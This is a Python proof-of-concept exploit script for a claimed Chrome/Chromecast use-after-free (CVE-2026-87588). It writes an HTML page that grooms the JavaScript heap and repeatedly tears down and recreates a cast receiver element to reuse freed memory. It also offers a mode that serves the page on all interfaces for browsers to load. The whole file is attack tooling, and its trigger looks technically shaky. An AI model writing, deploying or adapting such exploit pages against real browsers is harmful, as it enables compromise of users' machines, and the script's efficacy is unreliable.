#!/usr/bin/env python3
"""CVE-2026-87588 — Chrome/Chromecast UaF (fixed 153.0.8010.36). HTML page
that grooms the JS heap then frees/reuses a Chromecast receiver object."""
import sys
from pathlib import Path

HTML = b"""<!doctype html><html><head><meta charset=utf-8></head><body>
<cast-media-player id=m></cast-media-player>
<script>
// groom: allocate/free many typed arrays to shape the heap
var keep=[]; for(var i=0;i<0x2000;i++){keep.push(new Float64Array(0x100));}
for(var i=0;i<0x2000;i+=2){keep[i]=null;}
// trigger: rapid receiver teardown/recreate to reuse a freed slot
for(var r=0;r<256;r++){
  var m=document.getElementById('m');
  m.parentNode.removeChild(m);
  document.body.appendChild(m);
}
gc && gc();
</script></body></html>"""

def build() -> bytes: return HTML

def serve(port=8000):
    import http.server, socketserver
    Path("cve-2026-87588.html").write_bytes(HTML)
    with socketserver.TCPServer(("0.0.0.0", port), http.server.SimpleHTTPRequestHandler) as s:
        print(f"[+] http://0.0.0.0:{port}/cve-2026-87588.html"); s.serve_forever()

def main():
    if len(sys.argv) > 1 and sys.argv[1] == "--serve": serve()
    else:
        Path("cve-2026-87588.html").write_bytes(build()); print("[+] payload written")

if __name__ == "__main__":
    main()
